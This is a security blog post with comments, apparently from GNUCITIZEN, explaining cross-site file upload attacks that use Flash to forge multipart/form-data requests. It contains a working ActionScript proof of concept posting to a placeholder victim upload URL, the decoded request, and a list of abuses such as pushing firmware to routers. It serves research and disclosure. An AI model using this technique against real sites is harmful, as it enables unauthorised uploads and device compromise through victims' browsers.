<p>Unfortunately, when it comes to file upload facilities, developers often forget to make such checks relying on the fact that file uploads are not spoofable, which in general is the correct assumption. However, when dealing with Web technologies, we often stumble across nasty surprises. The reason CSRF attacks against file uploads are not possible is because the HTML FORM specifications are not versatile enough to define sub-fields like <code>filename=&quot;whatever.txt&quot;</code>, which are vital parts of the <code>multipart/form-data</code> specifications when submitting files. This is the only restriction and I will show you that attackers can easily overcome it with a bit of help from Flash.</p>
<h2 id="cross-site-file-uploads">Cross-site File Uploads</h2>
<p>We&#39;ve already proved that various forms of home routers can be <a href="/blog/hacking-the-interwebs/">entirely compromised</a> and hacked by <a href="/blog/flash-upnp-attack-faq/">forging UPnP requests with flash</a>. Now I will show you that file uploading facilities can be attacked in a similar way. Let&#39;s examine the following code, which you can compile with Flex2 SDK - <code>c:\Flex2\bin\mxmlc code.mxml</code>:</p>
<pre><code class="language-xml"><span class="tag">&lt;<span class="name">mx:Application</span> <span class="attr">xmlns:mx</span>=<span class="string">"http://www.adobe.com/2006/mxml"</span> <span class="attr">creationComplete</span>=<span class="string">"onAppInit()"</span>&gt;</span>
    <span class="tag">&lt;<span class="name">mx:Script</span>&gt;</span>
        /* by Petko D. Petkov; pdp
         * GNUCITIZEN
         **/
        import flash.net.*;

        private function onAppInit():void
        {
            var r:URLRequest = new URLRequest('http://victim.com/upload.php');

            r.method = 'POST';
            r.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22gc.txt%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0AHi from GNUCITIZEN%21%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22submit%22%0D%0A%0D%0ASubmit Query%0D%0A-----------------------------109092118919201--%0A');
            r.contentType = 'multipart/form-data; boundary=---------------------------109092118919201';

            navigateToURL(r, '_self');
        }
    <span class="tag">&lt;/<span class="name">mx:Script</span>&gt;</span>
<span class="tag">&lt;/<span class="name">mx:Application</span>&gt;</span></code></pre>
<p>If you carefully read the content of the script you will notice that we are preparing an <code>URLRequest</code> object which we load with a <code>POST</code> method, a <code>contentType</code> which equals to <code>multipart/form-data</code> and a url-encoded data text. If we unencode the text we get the following result. Now let&#39;s have a look at it as well. Notice the <code>filename=&quot;gc.txt&quot;</code> field:</p>
<pre><code class="language-http">-----------------------------109092118919201
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;gc.txt&quot;
Content-Type: text/plain

Hi from GNUCITIZEN!
-----------------------------109092118919201
Content-Disposition: form-data; name=&quot;submit&quot;

Submit Query
-----------------------------109092118919201--</code></pre>
<p>This looks like a valid <code>multipart/form-data</code> file upload, doesn&#39;t it? If you compile and execute the code you will see that the file upload is completely valid and will upload a file called <code>gc.txt</code> with content of <code>Hi from GNUCITIZEN!</code>. But you can also use the following PHP script to verify the result if you feel skeptical about the whole concept.</p>
<pre><code class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>] &gt; <span class="number">0</span>): <span class="meta">?&gt;</span>
    &lt;h1&gt;Failiure&lt;/h1&gt;
    &lt;pre&gt;
        <span class="meta">&lt;?php</span> print_r($_FILES) <span class="meta">?&gt;</span>
    &lt;/pre&gt;
<span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])): <span class="meta">?&gt;</span>
    &lt;h1&gt;Success&lt;/h1&gt;
    &lt;pre&gt;
        <span class="meta">&lt;?php</span> print_r($_FILES) <span class="meta">?&gt;</span>
        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]) <span class="meta">?&gt;</span>
    &lt;/pre&gt;
<span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span>
    &lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;
        &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>/&gt; 
        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>/&gt;
    &lt;/form&gt;

<h2 id="the-impact-of-cross-site-file-upload-csfu-attacks">The Impact of Cross-site File Upload (CSFU) Attacks</h2>
<p>Like CSRF attacks, there are plenty of things one can do with this type of technique. Here is a couple of evil things that come into my mind:</p>
<ul>
<li>Upload a nasty picture on someone&#39;s profile - I admit this is not very useful but still very funny and open for abuse.</li>
<li>Upload a shiny new firmware to the router that is under attack by using the user as a proxy. This is pretty nasty and given the fact that there are numerous authentication bypass and A-to-C bugs floating around, it is very, very feasible.</li>
<li>Upload a shiny new configuration file on the router that is under attack. Same as the one above - very feasible and easy to perform.</li>
<li>Upload executable scripts on CMS - this of course is a bit more targeted..</li>
</ul>

Opera is not affected. Here is a demonstration of his code:

I've only played with the AS2 LoadVars Class (Since I've been to lazy to setup Flex, etc), so I thought you couldn't use Flash to do that since LoadVars URL encodes whatever you put in request body.

Are there many differences between the LoadVars and URLRequest classes?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><code>LoadVars</code> is inferior when compared to <code>URLRequest</code> combined with <code>navigateToURL</code> or even better <code>sendToURL</code>. Simply put, the <code>navigateToURL</code> function will open the result into a browser window/tab while <code>sendToURL</code> will silently execute it in the background. No restrictions applied!

btw, setting up flex environment is not very hard. you just need the FlexSDK .zip file. Decompress it somewhere on the disk. write your MXML or AS and compile with mxmlc like this:
